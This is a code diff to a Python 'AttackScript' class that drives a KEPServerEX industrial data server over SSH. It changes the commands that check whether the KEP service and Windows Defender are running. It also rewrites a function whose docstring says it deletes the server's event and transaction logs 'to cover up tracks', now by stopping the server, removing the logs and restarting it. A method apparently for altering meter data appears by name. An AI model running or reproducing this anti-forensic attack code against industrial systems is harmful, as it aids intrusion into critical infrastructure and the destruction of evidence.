@@ -1493,7 +1493,6 @@ class AttackScript:
 
     # Functions for getting status for GUI
 
-    # TODO: kep_server_start()
     def kep_get_service_status(self) -> bool:
         """
         Get KEP service status
@@ -1501,8 +1500,7 @@ class AttackScript:
         Returns:
             bool: True/False based on whether KEPServerEXV6 is running or not.
         """
-        command_output = self.ssh_run_command(
-            r'powershell -command "Get-Service KEPServerEXV6 | Select-Object -Property Status"')
+        command_output = self.ssh_run_command('pwsh.exe -command "Get-Service KEPServerEXV6 | Select-Object -Property Status"')
         if "Running" in command_output:
             print("KEPSERVER Running")
             return True
@@ -1515,7 +1513,7 @@ class AttackScript:
         Returns:
             bool: True/False based on whether Windows Defender is enabled or not.
         """
-        command_output = self.ssh_run_command(r'powershell -command "Get-MpComputerStatus | select Antivirusenabled"')
+        command_output = self.ssh_run_command('pwsh.exe -command "Get-MpComputerStatus | select Antivirusenabled"')
         if "True" in command_output:
             print("Windows Defender Running")
             return True
@@ -1756,13 +1754,23 @@ class AttackScript:
 
     def kep_delete_log_files(self):
         """
-        Delete the log files to cover up tracks
+            Deletes the KEPServer event and transaction log files to cover up tracks.
+            The default path of the log files is: C:\\ProgramData\\Kepware\\KEPServerEX\\V6
         """
-        # NOTE: REMINDER TO TEST THIS ON OTHER FOLDER FIRST.
-        log_files_to_delete = ["event.log", "transactions.log"]
-        kep_default_log_folder_path = "C:\\ProgramData\\Kepware\\KEPServerEX\\V6\\"
-        for log_file in log_files_to_delete:
-            self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
+
+        stopKEP = self.kep_server_stop()
+
+        if stopKEP:
+            # Delete log files
+            log_files_to_delete = ["event.log", "transactions.log"]
+            kep_default_log_folder_path = "C:\\ProgramData\\Kepware\\KEPServerEX\\V6\\"
+            for log_file in log_files_to_delete:
+                self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
+
+            # Restart KEPServer after deletion
+            self.kep_server_start()
+        else:
+            print("Unable to delete log files as KEPServer is still running")
 
     def ChangeDataValueSendBack(self, meter_id: str):
         """
